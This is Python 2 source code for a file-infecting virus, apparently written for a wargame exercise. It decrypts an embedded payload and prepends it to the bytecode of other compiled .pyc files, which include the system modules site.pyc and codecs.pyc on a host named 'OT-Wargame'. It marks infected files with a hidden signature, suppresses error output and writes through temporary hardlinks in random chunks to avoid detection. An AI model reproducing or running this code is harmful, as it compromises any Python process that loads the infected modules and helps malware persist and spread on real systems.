__py_version__ = "\xFF\xFE\x0A\x20\xCA\xDD" # haha bullshit, this is a stealth signature
# -*- coding: utf-8 -*-
import socket
import marshal
import glob
import sys
import os
from random import randint
from uuid import uuid4 as uuid

sys.stderr = open("/dev/null", "w")

a = None
DECRYPT = None
exec "__XOR_LAYER_PY__"
crypt = a

def to_hex(s):
    return "\\x" + "\\x".join(c.encode("hex") for c in s)
    
    
def hardlink_write(content, file):

    size = len(content)
    offset = 0
    hardlink = "/tmp/%s" % uuid()
    os.link(file, hardlink)
    f = open(hardlink, 'w')
    f.close()
    os.unlink(hardlink)
    while(offset < size):
        os.link(file, hardlink)
        f = open(hardlink, 'a')
        size_chunk = randint(1, 1+(size-offset)/2)
        f.write(content[offset:offset+size_chunk])
        f.flush()
        offset += size_chunk
        f.close()
        os.unlink(hardlink)    

if __file__.endswith('.pyc'):
    template = "__TEMPLATE_PY__"
    template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)

    LOAD_CONST = None
    RETURN_VALUE = None
    Code = None
    CodeList = None
    EXEC_STMT = None
    exec "__BYTEPLAY_PY__"

    f = open(__file__, 'r')
    head = f.read(8)
    data = Code.from_code(marshal.loads(f.read()))
    f.close()
    payload = data

    EXPLOIT_SIZE = None
    for i in xrange(2, len(data.code)):
        if type(data.code[i][1]) == type('') and data.code[i][1] == __py_version__: #signature
            EXPLOIT_SIZE = i + 2
            break
            #if not EXPLOIT_SIZE:
            #print "EXPLOIT_SIZE not found"

    data.code = data.code[:EXPLOIT_SIZE]
    data.code.append((LOAD_CONST, None))
    data.code.append((RETURN_VALUE, None))
    payload_clear = marshal.dumps(data.to_code())

    def infect(f_to_infect):
        #print "j'infecte %s" % f_to_infect
        f = open(f_to_infect, 'r')

        head = f.read(8)

        data = Code.from_code(marshal.loads(f.read()))
        if data.code[1][1] == __py_version__: #signature
            return

        f.close()

        payload = to_hex(crypt(payload_clear))
        template_for_this_inject = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
        payload = Code.from_code(compile(template_for_this_inject, "", "exec")).code
        payload = payload[:-2]
        data.code[:0] = payload
        content = "".join([head,marshal.dumps(data.to_code())])
        hardlink_write(content, f_to_infect)

    if socket.gethostname() == "OT-Wargame":
        targets = ["/usr/lib/python2.6/site.pyc", "/usr/lib/python2.6/codecs.pyc"]
    else:
        targets = glob.glob("./targets/*.pyc")

    for i in targets:
        infect(i)

    exec "__PAYLOAD_PY__"

__py_version__ = "\xFF\xFE\x0A\x20\xCA\xDD" # haha bullshit, this is a stealth signature
